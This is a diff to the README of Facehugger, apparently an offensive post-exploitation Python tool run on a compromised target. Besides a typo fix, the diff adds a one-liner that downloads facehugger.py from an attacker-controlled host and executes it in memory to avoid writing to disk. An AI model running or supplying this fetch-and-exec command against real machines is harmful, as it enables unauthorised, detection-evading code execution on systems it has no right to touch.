@@ -20,13 +20,14 @@ If you lack sudo rights (for example in a situation in which you are pivoting fr
 Facehugger currently doesn't implement any kind of readline functionality to allow for command replay so I reccomend running it with rlwrap if it's installed on the target system.
 If you have already moved the script onto the target system then run
 ```
-rlwarp python3 facehugger.py
-```
-or without rlwrap
-```
 python3 facehugger.py
+rlwrap python3 facehugger.py # or with rlwrap
 ```
-If you wish to run Facehugger 100% in memory and what I recommend is to use python to get facehugger.py over the network and execute the 
+If you wish to run Facehugger 100% in memory and what I recommend is to use python to get facehugger.py over the network and execute it directly without touching metal. 
+To do this simply run the following on the target machine:
+```
+python3 -c "import requests; exec(requests.get('http://<attacker-ip>/facehugger.py').text)"
+```
 
 ## Modules
 
